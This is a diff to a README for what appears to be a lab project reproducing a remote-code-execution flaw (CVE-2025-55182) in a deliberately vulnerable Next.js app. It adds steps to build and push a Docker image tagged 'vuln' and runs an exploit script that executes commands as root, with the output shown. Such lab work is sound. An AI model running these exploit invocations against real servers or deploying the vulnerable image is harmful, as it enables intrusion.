@@ -5,6 +5,7 @@
 - [Vulnerable app](#vulnerable-app)
   - [Local App](#local-app)
   - [Dockerize](#dockerize)
+  - [Push image](#push-image)
 
 ---
 
@@ -16,6 +17,7 @@
 | --- | --------------------- | ------------------------------------- |
 | 1   | local app and exploit | create simple Next.js app and exploit |
 | 2   | Dockerize             | Create dokerfile, run and expoit      |
+| 3   | push image            | build and push                        |
 
 - reference: https://github.com/msanft/CVE-2025-55182
 
@@ -81,4 +83,35 @@ python scripts/rce.py http://localhost:3000 "id test"
 
 # executable response:
 # uid=1005(test) gid=1005(test) groups=1005(test)
+
+docker rm react2shell -f
+# react2shell
+```
+
+---
+
+## Push image
+
+```sh
+# build
+docker build -f app/Dockerfile.vuln -t simonangelfong/react2shell:vuln app
+
+docker login -u
+# push
+docker push simonangelfong/react2shell:vuln
+
+# test
+docker run --rm -d --name react2shell -p 3000:3000 simonangelfong/react2shell:vuln
+python scripts/rce.py http://localhost:3000 id
+# status code: 500
+# response text:
+# 0:{"a":"$@1","f":"","b":"development"}
+# 1:E{"digest":"uid=0(root) gid=0(root) groups=0(root)","name":"Error","message":"NEXT_REDIRECT","stack":[],"env":"Server"}
+
+# executable response:
+# uid=0(root) gid=0(root) groups=0(root)
+
+# cleanup
+docker rm react2shell -f
+# react2shell
 ```
